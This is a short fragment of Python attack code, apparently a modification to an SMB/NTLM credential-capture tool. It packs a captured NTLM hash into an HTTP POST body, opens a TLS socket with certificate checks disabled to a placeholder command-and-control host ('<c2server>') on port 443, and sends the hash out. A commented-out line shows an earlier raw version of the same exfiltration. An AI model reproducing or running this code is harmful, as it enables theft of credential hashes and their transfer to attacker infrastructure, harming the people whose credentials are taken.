...
Connection: close\r
\r\n"""
                    body = 'service=SMB&' + 'hash=' + ntlm_hash_data['hash_string']
                    body_bytes = body.encode('ascii')
                    header_bytes = headers.format(content_type="application/x-www-form-urlencoded", content_length=len(body_bytes), host = str("<c2server>") + ":" + "443").encode('iso-8859-1')
                    payload = header_bytes + body_bytes

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect(("<c2server>", 443))
                    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
#                    s.sendall("SMB" + "|" +  ntlm_hash_data['hash_string'] + "\n")
                    s.sendall(payload)
#END CHANGE MADE
            else:
